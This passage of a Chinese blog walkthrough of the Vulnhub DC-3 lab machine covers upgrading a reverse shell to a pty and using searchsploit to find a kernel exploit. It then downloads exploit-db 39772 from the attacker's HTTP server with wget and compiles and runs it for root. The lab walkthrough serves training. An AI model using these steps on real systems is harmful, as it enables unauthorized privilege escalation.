+<p><img src="/../../images/TargetTest/image-20230806125907044.png" alt="image-20230806125907044"></p>
+<p>反弹成功！！！</p>
+<p><img src="/../../images/TargetTest/image-20230806125929331.png" alt="image-20230806125929331"></p>
+<h5 id="Get交互shell"><a href="#Get交互shell" class="headerlink" title="Get交互shell"></a>Get交互shell</h5><pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806130710303.png" alt="image-20230806130710303"></p>
+<p> 交互shell获取成功，但是还不是root权限</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看操作系统版本信息</p>
+<pre class=" language-shell"><code class="language-shell">tac /etc/issue
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806131201874.png" alt="image-20230806131201874"></p>
+<pre class=" language-shell"><code class="language-shell">cat /proc/version
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806131314137.png" alt="image-20230806131314137"></p>
+<p>继续使用searchsploit工具搜索漏洞 ，打开另一个终端</p>
+<pre class=" language-shell"><code class="language-shell">searchsploit Ubuntu 16.04
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806131640058.png" alt="image-20230806131640058"></p>
+<p>Privilege Escalation（提权），这里我们使用通用4.4.x版本的提权方式</p>
+<p>使用find命令查找路径</p>
+<pre class=" language-shell"><code class="language-shell">find / -name '39772.txt'
+
+# 全部路径
+/usr/share/exploitdb/exploits/linux/local/39772.txt
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806131740267.png" alt="image-20230806131740267"></p>
+<p>可以直接用<code>searchsploit -p linux/local/39772.txt</code>会直接显示出绝对路径</p>
+<p><img src="/../../images/TargetTest/image-20230806160302414.png" alt="image-20230806160302414"></p>
+<pre class=" language-shell"><code class="language-shell">cat /usr/share/exploitdb/exploits/linux/local/39772.txt
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806161041304.png" alt="image-20230806161041304"></p>
+<blockquote>
+<p>溢出提权（exp提权）</p>
+</blockquote>
+<p><strong>利用exp提权</strong></p>
+<p><a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p>
+<p>下载39772.zip，粘贴复制到kali里（不能拖到kali里面，否则会出现丢包的现象）</p>
+<p><img src="/../../images/TargetTest/image-20230806132534453-1691309890182-1.png" alt="image-20230806132534453"></p>
+<p><img src="/../../images/TargetTest/image-20230806132648779.png" alt="image-20230806132648779"></p>
+<p>在桌面开启http服务，将下载好的文件导入到DC-3靶机里</p>
+<pre class=" language-shell"><code class="language-shell">python3 -m http.server 8888
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806132745825.png" alt="image-20230806132745825"></p>
+<p>浏览器进行访问<code>http://192.168.80.141:8888/</code></p>
+<p><img src="/../../images/TargetTest/image-20230806133026241.png" alt="image-20230806133026241"></p>
+<p>出现这个说明服务开启成功，exp地址是</p>
+<p><code>http://192.168.80.141:8888/39772/exploit.tar</code></p>
+<p>回到刚才的&#96;&#96;python交互shell&#96;</p>
+<pre class=" language-shell"><code class="language-shell">wget http://192.168.80.141:8888/39772/exploit.tar
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806133437137.png" alt="image-20230806132946215"></p>
+<p>下载完后用tar命令解压该压缩包</p>
+<pre class=" language-shell"><code class="language-shell">tar -xvf exploit.tar
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806133712617.png" alt="image-20230806133712617"></p>
+<pre class=" language-shell"><code class="language-shell">cd ebpf_mapfd_doubleput_exploit
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806160847229.png" alt="image-20230806160847229"></p>
+<p>执行</p>
+<pre class=" language-shell"><code class="language-shell">./compile.sh
+./doubleput
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806135029094.png" alt="image-20230806135029094"></p>
+<p>使用<code>whoami</code>查看当前用户</p>
+<p><img src="/../../images/TargetTest/image-20230806135110514.png" alt="image-20230806135110514"></p>
+<p>切换到<code>root</code>的家目录</p>
+<p><img src="/../../images/TargetTest/image-20230806135159050.png" alt="image-20230806135159050"></p>
+<p>查看<code>the-flag.txt</code></p>
+<p><img src="/../../images/TargetTest/image-20230806135244319.png" alt="image-20230806135244319"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">秋刀鱼-</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://hxysaury.github.io/2022/11/24/target-test/dc-3/">https://hxysaury.github.io/2022/11/24/target-test/dc-3/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">秋刀鱼-</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Vulnhub/">
+                                    <span class="chip bg-color">Vulnhub</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/11/27/target-test/dc-5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="【Vulnhub靶机】DC-5(suid提权)">
+                        
+                        <span class="card-title">【Vulnhub靶机】DC-5(suid提权)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Vulnhub/">
+                        <span class="chip bg-color">Vulnhub</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/11/20/vulnerability-database/apache-shiro-1.2.4-fan-xu-lie-hua-lou-dong-cve-2016-4437/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="【漏洞复现】Apache_Shiro_1.2.4_反序列化漏洞（CVE-2016-4437）">
+                        
+                        <span class="card-title">【漏洞复现】Apache_Shiro_1.2.4_反序列化漏洞（CVE-2016-4437）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E6%B8%97%E9%80%8F/" class="post-category">
+                                    Web渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 秋刀鱼-<br />'
+            + '文章作者: 秋刀鱼-<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2023</span>
+            
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">秋刀鱼-</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">232.7k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "10";
+                    var startDate = "1";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/hxysaury" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:318129549@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=318129549" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 318129549" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
